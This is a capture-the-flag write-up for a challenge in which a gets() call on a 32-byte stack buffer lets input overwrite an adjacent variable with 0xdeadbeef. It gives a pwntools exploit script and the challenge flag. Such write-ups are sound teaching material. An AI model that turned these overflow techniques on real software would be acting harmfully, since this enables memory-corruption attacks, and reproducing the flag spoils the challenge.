# Easter Egg Hunt - Writeup

**Flag:** `NCR{h0pp1ty_h0p_buff3r_0v3rfl0w}`

## Vulnerability

`main()` reads user input with `gets(basket)`, where `basket` is a 32-byte
stack buffer. `gets()` has no bounds checking at all, so any input longer
than 32 bytes overflows onto whatever comes next on the stack - in this
case, the local variable `eggs`.

The win condition just checks:

```c
if (eggs == 0xdeadbeef) {
    win();
}
```

`eggs` is never legitimately set to that value anywhere in the program, but
since it lives right next to `basket` on the stack, overflowing the input
buffer with the right number of padding bytes followed by the value
`0xdeadbeef` overwrites `eggs` directly.

## Exploit

```python
from pwn import *

p = process("./chall")

offset = 44
payload  = b"A" * offset
payload += p32(0xdeadbeef)

p.sendline(payload)
print(p.recvall().decode())
```

The 44-byte offset was found by pattern-matching the overflow (e.g. with a
cyclic pattern in gdb/pwndbg) to find exactly how many bytes separate the
start of `basket` from `eggs` on the stack for this binary/compiler. Once
`eggs` is overwritten with `0xdeadbeef`, `win()` runs and prints the flag.
